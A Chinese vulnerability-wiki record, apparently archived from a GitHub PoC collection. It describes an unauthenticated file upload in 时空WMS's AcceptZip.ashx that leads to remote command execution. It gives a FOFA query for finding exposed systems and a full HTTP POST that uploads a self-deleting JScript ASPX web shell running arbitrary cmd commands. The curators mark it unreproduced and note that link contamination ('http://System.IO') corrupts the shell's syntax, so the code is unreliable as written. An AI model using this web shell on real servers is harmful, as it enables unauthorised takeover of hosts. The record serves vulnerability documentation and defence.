---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "时空WMS AcceptZip.ashx上传ASPX执行声称"
product: "时空WMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；IIS JScript解析条件"
prerequisites: "匿名声称"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%97%B6%E7%A9%BAWMS/%E6%97%B6%E7%A9%BAWMS-%E4%BB%93%E5%82%A8%E7%B2%BE%E7%BB%86%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20AcceptZip.ashx%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%87%B4RCE%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"SKControlKLForJson.ashx\""
id: "vw-b1dc7a07fcdc23bacd22f39b"
entity_id: "ve-b1dc7a07fcdc23bacd22f39b"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 时空WMS AcceptZip.ashx上传ASPX执行声称

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：时空WMS；AcceptZip.ashx上传ASPX执行声称
- 版本、配置及部署条件：版本未知；IIS JScript解析条件
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 代码类型声明和File.Delete前出现http://System.IO，明显超链接/转存污染，会破坏JScript语法
- Down目录按时间寻找文件不够确定，需上传返回和实际GET执行响应
- 自删shell仍有写入/命令执行副作用，且e.Close在读流前可靠性须核
- 在野已知无来源，缺修复版本与源码；规范HTTP围栏

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

时空WMS-仓储精细化管理系统 AcceptZip.ashx 文件上传致RCE漏洞，未授权攻击者可上传恶意木马文件控制整个服务器。

## 影响版本

时空WMS

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA： body="SKControlKLForJson.ashx"

POC/EXP：

```http
POST /AcceptZip.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: text/plain

<%@ Page Language="jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:http://System.IO.StreamReader,EI:http://System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());http://System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```


![image-20250311135539357](./.resource/时空WMS-仓储精细化管理系统AcceptZip.ashx文件上传致RCE漏洞/media/image-20250311135539357.png)


上传后的路径为: /Down/  目录下时间线一致的文件

## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
